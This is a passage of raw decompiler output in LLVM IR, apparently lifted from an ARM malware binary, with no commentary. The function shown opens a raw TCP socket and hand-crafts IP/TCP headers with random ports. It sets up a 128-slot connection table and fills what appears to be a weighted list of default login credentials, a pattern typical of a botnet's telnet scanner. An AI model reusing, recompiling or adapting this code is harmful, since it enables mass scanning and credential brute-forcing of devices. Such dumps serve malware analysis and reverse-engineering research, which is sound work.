  %v2_10140 = load i32, i32* %r4.global-to-local, align 4
  %v3_10140 = inttoptr i32 %v2_10140 to i16*
  store i16 %v1_10140, i16* %v3_10140, align 2
  store i32 %v3_fffc, i32* @r4, align 4
  store i32 %v6_fffc, i32* @r5, align 4
  store i32 %v9_fffc, i32* @r6, align 4
  store i32 %v12_fffc, i32* @r7, align 4
  store i32 %v15_fffc, i32* @r8, align 4
  store i32 %v18_fffc, i32* @sb, align 4
  store i32 %v21_fffc, i32* @sl, align 4
  store i32 %v24_fffc, i32* @fp, align 4
  ret i32 %v1_1012c

; uselistorder directives
  uselistorder i32 %v3_100fc, { 1, 0 }
  uselistorder i32 %v1_100e8, { 0, 2, 3, 1 }
  uselistorder i32 %v0_100bc, { 1, 0, 2 }
  uselistorder i32 %v3_10090, { 1, 0 }
  uselistorder i32 %v1_1007c, { 0, 2, 3, 1 }
  uselistorder i32 %v0_10050, { 1, 0, 2 }
  uselistorder i32 %v2_1002c, { 1, 0, 2 }
  uselistorder i32 %v3_10020, { 1, 0 }
  uselistorder i32 %v1_10010, { 1, 0, 2 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 0 }
  uselistorder i32 (i8*)* @function_12480, { 27, 28, 0, 1, 2, 3, 4, 19, 20, 21, 22, 23, 24, 25, 26, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 79, 80, 81, 82, 83, 84, 85, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78 }
  uselistorder i32 %arg2, { 3, 2, 1, 0, 4 }
}

define i32 @function_1015c() local_unnamed_addr {
dec_label_pc_1015c:
  %cpsr_c.global-to-local = alloca i1, align 1
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %tmp296 = call i32 @__decompiler_undefined_function_0()
  %tmp300 = call i32 @__decompiler_undefined_function_0()
  %tmp301 = call i32 @__decompiler_undefined_function_0()
  %tmp302 = call i16 @__decompiler_undefined_function_1()
  %stack_var_-42 = alloca i32, align 4
  %stack_var_-77 = alloca i32, align 4
  %stack_var_-45 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-352 = alloca i32, align 4
  %stack_var_-224 = alloca i32, align 4
  %stack_var_-68 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-96 = alloca i32, align 4
  %stack_var_-104 = alloca i32, align 4
  %stack_var_-1866 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %v3_1015c = load i32, i32* @r4, align 4
  %v0_10168 = call i32 @function_12e08()
  store i32 %v0_10168, i32* %r0.global-to-local, align 4
  %v7_1016c = icmp eq i32 %v0_10168, -1
  %. = zext i1 %v7_1016c to i32
  %tmp335 = icmp slt i32 %v0_10168, 1
  %storemerge294 = select i1 %tmp335, i32 %., i32 1
  store i32 %storemerge294, i32* @r4, align 4
  store i32 ptrtoint (i32* @global_var_233b8.181 to i32), i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_10188 = icmp eq i32 %storemerge294, 0
  store i1 %v2_10188, i1* %cpsr_z.global-to-local, align 1
  store i32 %v0_10168, i32* @global_var_233b8.181, align 4
  br i1 %v2_10188, label %dec_label_pc_101a4, label %dec_label_pc_10194

dec_label_pc_10194:                               ; preds = %dec_label_pc_1015c
  store i32 %v3_1015c, i32* %r4.global-to-local, align 4
  ret i32 %v0_10168

dec_label_pc_101a4:                               ; preds = %dec_label_pc_1015c
  %v0_101a4 = call i32 @function_1273c()
  store i32 %v0_101a4, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_23394.88 to i32), i32* %r1.global-to-local, align 4
  store i32 %v0_101a4, i32* @global_var_23394.88, align 4
  %v1_101b0 = call i32 @function_f75c(i32 %v0_101a4)
  %v0_101b4 = load i32, i32* @r4, align 4
  store i32 %v0_101b4, i32* %r0.global-to-local, align 4
  %v1_101b8 = inttoptr i32 %v0_101b4 to i32*
  %v2_101b8 = call i32 @function_12d98(i32* %v1_101b8)
  store i32 ptrtoint (i32* @global_var_21360.183 to i32), i32* %r2.global-to-local, align 4
  store i32 288, i32* %r1.global-to-local, align 4
  store i32 %v2_101b8, i32* @global_var_21360.183, align 4
  store i32 128, i32* %r0.global-to-local, align 4
  %v2_101cc = call i32 @function_144a8(i32 128, i32 288)
  store i32 ptrtoint (i32* @global_var_233b0.194 to i32), i32* %r3.global-to-local, align 4
  %v0_101d4 = load i32, i32* @r4, align 4
  store i32 %v0_101d4, i32* %stack_var_-52, align 4
  store i32 %v2_101cc, i32* @global_var_233b0.194, align 4
  store i32 %v0_101d4, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_101e0

dec_label_pc_101e0:                               ; preds = %dec_label_pc_101e0.dec_label_pc_101e0_crit_edge, %dec_label_pc_101a4
  %v2_101ec = phi i32 [ %v2_101ec.pre, %dec_label_pc_101e0.dec_label_pc_101e0_crit_edge ], [ %v2_101cc, %dec_label_pc_101a4 ]
  %v0_101f4 = phi i32 [ %v0_10224, %dec_label_pc_101e0.dec_label_pc_101e0_crit_edge ], [ %v0_101d4, %dec_label_pc_101a4 ]
  %v3_101e8 = mul i32 %v0_101f4, 256
  store i32 %v3_101e8, i32* %ip.global-to-local, align 4
  %v2_101fc = mul i32 %v0_101f4, 288
  %v1_10204 = add i32 %v0_101f4, 1
  store i32 %v1_10204, i32* %r0.global-to-local, align 4
  %v2_10208 = add i32 %v2_101fc, %v2_101ec
  store i32 %v2_10208, i32* %r2.global-to-local, align 4
  store i32 %v2_10208, i32* %r1.global-to-local, align 4
  store i32 0, i32* @r5, align 4
  store i32 -1, i32* @r3, align 4
  %v2_1021c = add i32 %v2_10208, 4
  %v3_1021c = inttoptr i32 %v2_1021c to i32*
  store i32 -1, i32* %v3_1021c, align 4
  %v0_10220 = load i32, i32* @r5, align 4
  %v1_10220 = load i32, i32* %r1.global-to-local, align 4
  %v2_10220 = add i32 %v1_10220, 12
  %v3_10220 = inttoptr i32 %v2_10220 to i32*
  store i32 %v0_10220, i32* %v3_10220, align 4
  %v0_10224 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_10224, i32* %stack_var_-52, align 4
  %v7_10228 = icmp sgt i32 %v1_10204, 127
  br i1 %v7_10228, label %dec_label_pc_1022c, label %dec_label_pc_101e0.dec_label_pc_101e0_crit_edge

dec_label_pc_101e0.dec_label_pc_101e0_crit_edge:  ; preds = %dec_label_pc_101e0
  %v2_101ec.pre = load i32, i32* @global_var_233b0.194, align 4
  br label %dec_label_pc_101e0

dec_label_pc_1022c:                               ; preds = %dec_label_pc_101e0
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  store i32 6, i32* %r2.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 3, i32* %r1.global-to-local, align 4
  %v3_10238 = call i32 @function_13940(i32 2, i32 3, i32 6)
  store i32 %v3_10238, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_233b4.196 to i32), i32* %r2.global-to-local, align 4
  %v2_10240 = icmp eq i32 %v3_10238, -1
  store i1 %v2_10240, i1* %cpsr_c.global-to-local, align 1
  %v7_10240 = icmp eq i32 %v3_10238, -1
  store i1 %v7_10240, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_10238, i32* %r4.global-to-local, align 4
  store i32 %v3_10238, i32* @global_var_233b4.196, align 4
  br i1 %v7_10240, label %dec_label_pc_10b78, label %dec_label_pc_10250

dec_label_pc_10250:                               ; preds = %dec_label_pc_1022c
  store i32 3, i32* %r1.global-to-local, align 4
  %v0_10254 = load i32, i32* @r5, align 4
  store i32 %v0_10254, i32* %r2.global-to-local, align 4
  %v2_10258 = call i32 @function_12f80(i32 %v3_10238, i32 3)
  store i32 4, i32* %r1.global-to-local, align 4
  %v1_10260 = or i32 %v2_10258, 2048
  store i32 %v1_10260, i32* %r2.global-to-local, align 4
  %v0_10264 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_10264, i32* %r0.global-to-local, align 4
  %v2_10268 = call i32 @function_12f80(i32 %v0_10264, i32 4)
  %v2_10270 = load i32, i32* @global_var_233b4.196, align 4
  store i32 %v2_10270, i32* %r0.global-to-local, align 4
  store i32 1, i32* %ip.global-to-local, align 4
  %v0_1027c = load i32, i32* @r5, align 4
  store i32 %v0_1027c, i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v2_10284 = ptrtoint i32* %stack_var_-52 to i32
  store i32 %v2_10284, i32* %r3.global-to-local, align 4
  store i32 1, i32* %stack_var_-52, align 4
  %v5_10294 = call i32 @function_138fc(i32 %v2_10270, i32 %v0_1027c, i32 3, i32 %v2_10284, i32 4)
  store i32 %v5_10294, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_10298 = icmp eq i32 %v5_10294, 0
  store i1 %v2_10298, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_10298, label %dec_label_pc_102a0, label %dec_label_pc_10b6c

dec_label_pc_102a0:                               ; preds = %dec_label_pc_10250, %dec_label_pc_102a0
  %v0_102a0 = call i32 @function_f700()
  %v1_102ac = urem i32 %v0_102a0, 256
  store i32 %v1_102ac, i32* %r3.global-to-local, align 4
  %tmp338 = udiv i32 %v0_102a0, 256
  %v3_102b0 = urem i32 %tmp338, 256
  %v4_102b4 = mul nuw nsw i32 %v1_102ac, 256
  %v5_102b4 = or i32 %v4_102b4, %v3_102b0
  store i32 %v5_102b4, i32* %r0.global-to-local, align 4
  %v2_102b8 = icmp ugt i32 %v5_102b4, 1023
  store i1 %v2_102b8, i1* %cpsr_c.global-to-local, align 1
  %v7_102b8 = icmp eq i32 %v5_102b4, 1024
  store i1 %v7_102b8, i1* %cpsr_z.global-to-local, align 1
  %v3_102c0 = icmp ult i32 %v5_102b4, 1022
  br i1 %v3_102c0, label %dec_label_pc_102a0, label %dec_label_pc_102c4

dec_label_pc_102c4:                               ; preds = %dec_label_pc_102a0
  %v5_102bc.le = trunc i32 %v0_102a0 to i16
  store i32 ptrtoint (i8** @global_var_21330.198 to i32), i32* %r0.global-to-local, align 4
  %v2_102c8 = load i8, i8* bitcast (i8** @global_var_21330.198 to i8*), align 4
  %v3_102c8 = zext i8 %v2_102c8 to i32
  %v1_102cc = and i32 %v3_102c8, 240
  %v1_102d0 = or i32 %v1_102cc, 5
  store i32 %v1_102d0, i32* %r3.global-to-local, align 4
  store i32 69, i32* %r2.global-to-local, align 4
  store i32 10240, i32* %r1.global-to-local, align 4
  store i8 69, i8* bitcast (i8** @global_var_21330.198 to i8*), align 4
  store i16 10240, i16* bitcast (i32* @global_var_21332.199 to i16*), align 4
  %v0_102f0 = call i32 @function_f700()
  %v1_102f0 = trunc i32 %v0_102f0 to i16
  %v3_102f8 = load i8, i8* @global_var_21350.202, align 1
  store i32 ptrtoint (i16* @global_var_21344.201 to i32), i32* @lr, align 4
  store i32 ptrtoint (i8** @global_var_21330.198 to i32), i32* %ip.global-to-local, align 4
  %tmp = urem i8 %v3_102f8, 16
  %v1_10304 = zext i8 %tmp to i32
  %v1_10308 = or i32 %v1_10304, 80
  store i32 %v1_10308, i32* %r2.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 6, i32* @r4, align 4
  store i8 64, i8* bitcast (i32* @global_var_21338.203 to i8*), align 4
  store i16 %v1_102f0, i16* bitcast (i32* @global_var_21334.204 to i16*), align 4
  %v1_1031c = trunc i32 %v1_10308 to i8
  store i8 %v1_1031c, i8* @global_var_21350.202, align 1
  store i8 6, i8* bitcast (i32* @global_var_21339.205 to i8*), align 4
  %v4_10324 = sext i16 %v5_102bc.le to i32
  store i32 %v4_10324, i32* %r1.global-to-local, align 4
  store i32 5888, i32* %r0.global-to-local, align 4
  store i16 5888, i16* @global_var_21346.206, align 2
  store i16 %v5_102bc.le, i16* @global_var_21344.201, align 2
  %v0_10334 = call i32 @function_f700()
  %v1_10334 = trunc i32 %v0_10334 to i16
  %v3_1033c = load i8, i8* @global_var_21351.207, align 1
  %v4_1033c = zext i8 %v3_1033c to i32
  store i32 ptrtoint (i16* @global_var_21344.201 to i32), i32* %ip.global-to-local, align 4
  %v1_10344 = or i32 %v4_1033c, 2
  store i32 %v1_10344, i32* %r3.global-to-local, align 4
  store i16 %v1_10334, i16* bitcast (i32* @global_var_21352.208 to i16*), align 4
  store i32 ptrtoint (i32* @global_var_185f4.210 to i32), i32* %r1.global-to-local, align 4
  %v1_10350 = trunc i32 %v1_10344 to i8
  store i8 %v1_10350, i8* @global_var_21351.207, align 1
  store i32 ptrtoint ([5 x i8]* @global_var_185ec.212 to i32), i32* %r0.global-to-local, align 4
  store i32 10, i32* %r2.global-to-local, align 4
  %v4_1035c = call i32 @function_fffc(i32 ptrtoint ([5 x i8]* @global_var_185ec.212 to i32), i32 ptrtoint (i32* @global_var_185f4.210 to i32), i32 10)
  store i32 ptrtoint ([5 x i8]* @global_var_185ec.212 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_185fc.214 to i32), i32* %r1.global-to-local, align 4
  store i32 9, i32* %r2.global-to-local, align 4
  %v5_1036c = call i32 @function_fffc(i32 ptrtoint ([5 x i8]* @global_var_185ec.212 to i32), i32 ptrtoint ([6 x i8]* @global_var_185fc.214 to i32), i32 9)
  store i32 ptrtoint ([5 x i8]* @global_var_185ec.212 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_18604.216 to i32), i32* %r1.global-to-local, align 4
  store i32 8, i32* %r2.global-to-local, align 4
  %v5_1037c = call i32 @function_fffc(i32 ptrtoint ([5 x i8]* @global_var_185ec.212 to i32), i32 ptrtoint ([6 x i8]* @global_var_18604.216 to i32), i32 8)
  store i32 ptrtoint ([6 x i8]* @global_var_18604.216 to i32), i32* %r0.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_18604.216 to i32), i32* %r1.global-to-local, align 4
  %v5_1038c = call i32 @function_fffc(i32 ptrtoint ([6 x i8]* @global_var_18604.216 to i32), i32 ptrtoint ([6 x i8]* @global_var_18604.216 to i32), i32 7)
  %v0_10390 = load i32, i32* @r4, align 4
  store i32 %v0_10390, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_185ec.212 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1860c.218 to i32), i32* %r1.global-to-local, align 4
  %v4_1039c = call i32 @function_fffc(i32 ptrtoint ([5 x i8]* @global_var_185ec.212 to i32), i32 ptrtoint (i32* @global_var_1860c.218 to i32), i32 %v0_10390)
  store i32 ptrtoint ([5 x i8]* @global_var_185ec.212 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_18614.220 to i32), i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  %v5_103ac = call i32 @function_fffc(i32 ptrtoint ([5 x i8]* @global_var_185ec.212 to i32), i32 ptrtoint ([8 x i8]* @global_var_18614.220 to i32), i32 5)
  store i32 ptrtoint ([5 x i8]* @global_var_185ec.212 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_1861c.222 to i32), i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  %v5_103bc = call i32 @function_fffc(i32 ptrtoint ([5 x i8]* @global_var_185ec.212 to i32), i32 ptrtoint ([8 x i8]* @global_var_1861c.222 to i32), i32 5)
  store i32 ptrtoint ([5 x i8]* @global_var_185ec.212 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_18624.224 to i32), i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  %v5_103cc = call i32 @function_fffc(i32 ptrtoint ([5 x i8]* @global_var_185ec.212 to i32), i32 ptrtoint ([9 x i8]* @global_var_18624.224 to i32), i32 5)
  store i32 ptrtoint ([5 x i8]* @global_var_185ec.212 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_18630.226 to i32), i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  %v4_103dc = call i32 @function_fffc(i32 ptrtoint ([5 x i8]* @global_var_185ec.212 to i32), i32 ptrtoint (i32* @global_var_18630.226 to i32), i32 5)
  store i32 ptrtoint ([5 x i8]* @global_var_185ec.212 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_18638.228 to i32), i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  %v4_103ec = call i32 @function_fffc(i32 ptrtoint ([5 x i8]* @global_var_185ec.212 to i32), i32 ptrtoint (i32* @global_var_18638.228 to i32), i32 5)
  store i32 ptrtoint ([8 x i8]* @global_var_18640.230 to i32), i32* %r0.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_18640.230 to i32), i32* %r1.global-to-local, align 4
  %v5_103fc = call i32 @function_fffc(i32 ptrtoint ([8 x i8]* @global_var_18640.230 to i32), i32 ptrtoint ([8 x i8]* @global_var_18640.230 to i32), i32 5)
  store i32 ptrtoint ([5 x i8]* @global_var_185ec.212 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_18528.232 to i32), i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  %v4_1040c = call i32 @function_fffc(i32 ptrtoint ([5 x i8]* @global_var_185ec.212 to i32), i32 ptrtoint (i32* @global_var_18528.232 to i32), i32 4)
  store i32 ptrtoint ([6 x i8]* @global_var_18604.216 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_18648.234 to i32), i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  %v5_1041c = call i32 @function_fffc(i32 ptrtoint ([6 x i8]* @global_var_18604.216 to i32), i32 ptrtoint ([9 x i8]* @global_var_18648.234 to i32), i32 4)
  store i32 ptrtoint ([5 x i8]* @global_var_185ec.212 to i32), i32* %r0.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_185ec.212 to i32), i32* %r1.global-to-local, align 4
  %v5_1042c = call i32 @function_fffc(i32 ptrtoint ([5 x i8]* @global_var_185ec.212 to i32), i32 ptrtoint ([5 x i8]* @global_var_185ec.212 to i32), i32 4)
  store i32 ptrtoint ([5 x i8]* @global_var_185ec.212 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_18654.236 to i32), i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  %v4_1043c = call i32 @function_fffc(i32 ptrtoint ([5 x i8]* @global_var_185ec.212 to i32), i32 ptrtoint (i32* @global_var_18654.236 to i32), i32 4)
  store i32 ptrtoint ([5 x i8]* @global_var_1865c.238 to i32), i32* %r0.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_1865c.238 to i32), i32* %r1.global-to-local, align 4
  %v5_1044c = call i32 @function_fffc(i32 ptrtoint ([5 x i8]* @global_var_1865c.238 to i32), i32 ptrtoint ([5 x i8]* @global_var_1865c.238 to i32), i32 3)
  store i32 ptrtoint ([6 x i8]* @global_var_18604.216 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_18528.232 to i32), i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v4_1045c = call i32 @function_fffc(i32 ptrtoint ([6 x i8]* @global_var_18604.216 to i32), i32 ptrtoint (i32* @global_var_18528.232 to i32), i32 3)
  store i32 ptrtoint ([5 x i8]* @global_var_185ec.212 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_18664.240 to i32), i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v5_1046c = call i32 @function_fffc(i32 ptrtoint ([5 x i8]* @global_var_185ec.212 to i32), i32 ptrtoint ([5 x i8]* @global_var_18664.240 to i32), i32 3)
  store i32 ptrtoint ([6 x i8]* @global_var_18604.216 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1866c.242 to i32), i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v4_1047c = call i32 @function_fffc(i32 ptrtoint ([6 x i8]* @global_var_18604.216 to i32), i32 ptrtoint (i32* @global_var_1866c.242 to i32), i32 3)
  store i32 ptrtoint ([5 x i8]* @global_var_185ec.212 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_18678.244 to i32), i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v4_1048c = call i32 @function_fffc(i32 ptrtoint ([5 x i8]* @global_var_185ec.212 to i32), i32 ptrtoint (i32* @global_var_18678.244 to i32), i32 3)
  store i32 ptrtoint ([6 x i8]* @global_var_18604.216 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_18680.246 to i32), i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v5_1049c = call i32 @function_fffc(i32 ptrtoint ([6 x i8]* @global_var_18604.216 to i32), i32 ptrtoint ([9 x i8]* @global_var_18680.246 to i32), i32 3)
  store i32 ptrtoint ([6 x i8]* @global_var_18604.216 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_18678.244 to i32), i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v4_104ac = call i32 @function_fffc(i32 ptrtoint ([6 x i8]* @global_var_18604.216 to i32), i32 ptrtoint (i32* @global_var_18678.244 to i32), i32 2)
  store i32 ptrtoint ([5 x i8]* @global_var_185ec.212 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1868c.248 to i32), i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v4_104bc = call i32 @function_fffc(i32 ptrtoint ([5 x i8]* @global_var_185ec.212 to i32), i32 ptrtoint (i32* @global_var_1868c.248 to i32), i32 2)
  store i32 ptrtoint ([5 x i8]* @global_var_185ec.212 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_18648.234 to i32), i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v5_104cc = call i32 @function_fffc(i32 ptrtoint ([5 x i8]* @global_var_185ec.212 to i32), i32 ptrtoint ([9 x i8]* @global_var_18648.234 to i32), i32 2)
  store i32 ptrtoint ([5 x i8]* @global_var_185ec.212 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_18694.250 to i32), i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v4_104dc = call i32 @function_fffc(i32 ptrtoint ([5 x i8]* @global_var_185ec.212 to i32), i32 ptrtoint (i32* @global_var_18694.250 to i32), i32 2)
  store i32 ptrtoint ([5 x i8]* @global_var_185ec.212 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1869c.252 to i32), i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v4_104ec = call i32 @function_fffc(i32 ptrtoint ([5 x i8]* @global_var_185ec.212 to i32), i32 ptrtoint (i32* @global_var_1869c.252 to i32), i32 1)
  store i32 ptrtoint ([14 x i8]* @global_var_186a4.254 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_186b4.256 to i32), i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v5_104fc = call i32 @function_fffc(i32 ptrtoint ([14 x i8]* @global_var_186a4.254 to i32), i32 ptrtoint ([7 x i8]* @global_var_186b4.256 to i32), i32 1)
  store i32 ptrtoint ([8 x i8]* @global_var_186bc.258 to i32), i32* %r0.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_186bc.258 to i32), i32* %r1.global-to-local, align 4
  %v5_1050c = call i32 @function_fffc(i32 ptrtoint ([8 x i8]* @global_var_186bc.258 to i32), i32 ptrtoint ([8 x i8]* @global_var_186bc.258 to i32), i32 1)
  store i32 ptrtoint ([11 x i8]* @global_var_186c4.260 to i32), i32* %r0.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([11 x i8]* @global_var_186c4.260 to i32), i32* %r1.global-to-local, align 4
  %v5_1051c = call i32 @function_fffc(i32 ptrtoint ([11 x i8]* @global_var_186c4.260 to i32), i32 ptrtoint ([11 x i8]* @global_var_186c4.260 to i32), i32 1)
  store i32 ptrtoint ([6 x i8]* @global_var_186d0.262 to i32), i32* %r0.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_186d0.262 to i32), i32* %r1.global-to-local, align 4
  %v5_1052c = call i32 @function_fffc(i32 ptrtoint ([6 x i8]* @global_var_186d0.262 to i32), i32 ptrtoint ([6 x i8]* @global_var_186d0.262 to i32), i32 1)
  store i32 ptrtoint ([6 x i8]* @global_var_186d0.262 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_18654.236 to i32), i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v4_1053c = call i32 @function_fffc(i32 ptrtoint ([6 x i8]* @global_var_186d0.262 to i32), i32 ptrtoint (i32* @global_var_18654.236 to i32), i32 1)
  store i32 ptrtoint ([6 x i8]* @global_var_186d0.262 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_18654.236 to i32), i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v4_1054c = call i32 @function_fffc(i32 ptrtoint ([6 x i8]* @global_var_186d0.262 to i32), i32 ptrtoint (i32* @global_var_18654.236 to i32), i32 1)
  store i32 ptrtoint (i32* @global_var_186d8.264 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_18648.234 to i32), i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v4_1055c = call i32 @function_fffc(i32 ptrtoint (i32* @global_var_186d8.264 to i32), i32 ptrtoint ([9 x i8]* @global_var_18648.234 to i32), i32 1)
  store i32 ptrtoint ([14 x i8]* @global_var_186e0.266 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_18694.250 to i32), i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v4_1056c = call i32 @function_fffc(i32 ptrtoint ([14 x i8]* @global_var_186e0.266 to i32), i32 ptrtoint (i32* @global_var_18694.250 to i32), i32 1)
  store i32 ptrtoint (i32* @global_var_1868c.248 to i32), i32* %r0.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1868c.248 to i32), i32* %r1.global-to-local, align 4
  %v3_1057c = call i32 @function_fffc(i32 ptrtoint (i32* @global_var_1868c.248 to i32), i32 ptrtoint (i32* @global_var_1868c.248 to i32), i32 1)
  store i32 ptrtoint (i32* @global_var_1860c.218 to i32), i32* %r0.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1860c.218 to i32), i32* %r1.global-to-local, align 4
  %v3_1058c = call i32 @function_fffc(i32 ptrtoint (i32* @global_var_1860c.218 to i32), i32 ptrtoint (i32* @global_var_1860c.218 to i32), i32 1)
  store i32 ptrtoint ([5 x i8]* @global_var_186f0.268 to i32), i32* %r0.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_186f0.268 to i32), i32* %r1.global-to-local, align 4
  %v5_1059c = call i32 @function_fffc(i32 ptrtoint ([5 x i8]* @global_var_186f0.268 to i32), i32 ptrtoint ([5 x i8]* @global_var_186f0.268 to i32), i32 1)
  store i32 ptrtoint ([5 x i8]* @global_var_185ec.212 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_186f8.270 to i32), i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v4_105ac = call i32 @function_fffc(i32 ptrtoint ([5 x i8]* @global_var_185ec.212 to i32), i32 ptrtoint (i32* @global_var_186f8.270 to i32), i32 1)
  store i32 ptrtoint ([5 x i8]* @global_var_185ec.212 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_18700.272 to i32), i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
